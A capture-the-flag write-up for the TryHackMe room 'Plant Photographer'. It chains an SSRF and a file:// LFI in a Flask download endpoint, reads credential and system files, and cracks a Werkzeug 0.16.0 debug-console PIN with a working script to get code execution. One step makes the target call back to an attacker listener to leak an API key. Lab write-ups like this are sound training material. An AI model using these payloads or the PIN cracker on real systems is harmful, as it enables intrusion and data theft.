# TryHackMe - Plant Photographer

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Hard  
**Category:** Web, SSRF, LFI, Werkzeug RCE  
**Room:** [Plant Photographer](https://tryhackme.com/room/plantphotographer)

## Introduction

Jay built a Flask portfolio for plant photography. The application exposes a document download feature, an admin panel restricted to localhost, and a Werkzeug debug console protected by a PIN.

**Objectives:**
- Recover the leaked API key
- Access the admin-only content
- Achieve RCE and read the final flag file

---

## Reconnaissance

An initial port scan and directory brute-force help map the attack surface before touching the application logic.

### Nmap

```bash
nmap -sC -sV <TARGET_IP>
```

Typical results include HTTP on port 80 serving the Flask application.

### Directory enumeration

Gobuster (or Feroxbuster) discovers hidden routes on the web server:

```bash
feroxbuster -u http://<TARGET_IP>/
```

| Path | Notes |
|------|-------|
| `/` | Plant photo portfolio |
| `/download?server=...&id=...` | Fetches PDFs from a "secure storage" backend |
| `/admin` | Short error response — localhost-only |
| `/console` | Werkzeug interactive debugger (PIN required) |

The download endpoint builds requests like:

```
/download?server=secure-file-storage.com:8087&id=75482342
```

The presence of a user-controlled `server` parameter immediately suggests **Server-Side Request Forgery (SSRF)** as a primary attack vector.

---

## Enumeration

### Source code leak via LFI

Reading `/download` handler logic (via LFI, see below) shows **pycurl** fetching remote URLs and attaching a hard-coded `X-API-KEY` header. That header value is the first room answer.

### Admin interface restriction

The `/admin` route checks `request.remote_addr == '127.0.0.1'`. Spoofing headers such as `X-Forwarded-For` does **not** bypass this check. The app also listens internally on port **8087**, which becomes relevant for SSRF-based localhost access.

### Werkzeug debug console

The `/console` endpoint runs Werkzeug **0.16.0** (visible in response headers). Older versions derive the PIN from predictable machine attributes — a known weakness if local files can be read.

---

## Exploitation

### Initial access — SSRF header leak (Question 1)

The `/download` endpoint uses pycurl:

```python
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
crl.setopt(crl.HTTPHEADER, ['X-API-KEY: <redacted>'])
```

**Method A — Netcat listener**

Start a listener on your attack machine:

```bash
nc -lvnp 8080
```

Trigger the application to connect back:

```bash
curl "http://<TARGET_IP>/download?server=http://<YOUR_IP>:8080?&id=1"
```

The `?` before `&id=1` is important: pycurl treats it as the end of the URL, while Flask still parses `id=1`. The incoming request exposes the `X-API-KEY` header.

**Method B — LFI of app.py**

```bash
curl "http://<TARGET_IP>/download?server=file:///usr/src/app/app.py%23&id=1"
```

Submit the recovered API key on TryHackMe.

---

### Admin section (Question 2)

Because `/admin` is localhost-only, SSRF to the internal service is required:

```bash
curl -s "http://<TARGET_IP>/download?server=http://127.0.0.1:8087/admin%23&id=1" -o flag.pdf
strings flag.pdf
```

Alternatively, read the PDF directly via LFI:

```bash
curl -s "http://<TARGET_IP>/download?server=file:///usr/src/app/private-docs/flag.pdf%23&id=1" -o flag.pdf
```

Submit the flag found inside the PDF on TryHackMe.

---

### LFI via `file://` and URL fragments

pycurl always appends `/public-docs-k057230990384293/{id}.pdf` to the URL. A **URL fragment** (`%23` = `#`) truncates the path so arbitrary local files can be read:

```
file:///etc/passwd%23&id=1
→ pycurl reads file:///etc/passwd
```

Useful reads for PIN cracking and further exploitation:

```bash
curl "http://<TARGET_IP>/download?server=file:///etc/passwd%23&id=1"
curl "http://<TARGET_IP>/download?server=file:///usr/src/app/app.py%23&id=1"
curl "http://<TARGET_IP>/download?server=file:///sys/class/net/eth0/address%23&id=1"
curl "http://<TARGET_IP>/download?server=file:///proc/self/cgroup%23&id=1"
```

---

### RCE via Werkzeug console (Question 3)

#### Crack Werkzeug 0.16.0 PIN

Version 0.16.0 uses **MD5** (not SHA1 like newer releases). Public PIN components:

- username: `root`
- modname: `flask.app`
- appname: `Flask`
- filepath: `/usr/local/lib/python3.10/site-packages/flask/app.py`

Private components (unique per deployment):

- MAC address of `eth0` (decimal)
- machine-id from `/proc/self/cgroup` (Docker container ID after the last `/`)

Reference script (adapt MAC and cgroup values to **your** instance):

```python
import hashlib

probably_public_bits = [
    "root",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.10/site-packages/flask/app.py",
]

private_bits = [
    str(int("XX:XX:XX:XX:XX:XX".replace(":", ""), 16)),  # your MAC
    "<your-cgroup-container-id>",                        # from /proc/self/cgroup
]

h = hashlib.md5()
for bit in probably_public_bits + private_bits:
    if bit:
        h.update(bit.encode())
h.update(b"cookiesalt")
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
pin = "-".join([num[:3], num[3:6], num[6:]])
print("PIN:", pin)
```

Open `http://<TARGET_IP>/console`, enter the PIN, and execute Python in the debugger.

#### Read the final flag

```python
import os
print(os.popen('ls /usr/src/app').read())
print(open('/usr/src/app/flag-982374827648721338.txt').read())
```

Or establish a reverse shell from the console for interactive access.

---

## Flags

| Question | How to obtain |
|----------|---------------|
| API key | SSRF listener or LFI of `app.py` |
| Admin flag | SSRF to localhost:8087/admin or LFI of `flag.pdf` |
| Web file flag | Werkzeug console RCE → read flag file in `/usr/src/app/` |

*Flag values are intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/plantphotographer).*

---

## Conclusion

### What I learned

| Technique | Takeaway |
|-----------|----------|
| SSRF (pycurl) | User-controlled `server` parameter drives outbound HTTP |
| URL fragment (`%23`) | Bypasses forced path concatenation in LFI/SSRF chains |
| `?&id=1` trick | Separates pycurl URL parsing from Flask query parameters |
| Localhost bypass | SSRF to `127.0.0.1:8087` when header spoofing fails |
| Werkzeug 0.16.0 | PIN uses MD5 + machine-specific private bits |
| Docker deployments | `/proc/self/cgroup` often replaces `/etc/machine-id` |

This room chains SSRF, LFI, and debug-console abuse into a full RCE path — a realistic reminder to never expose Werkzeug in production.
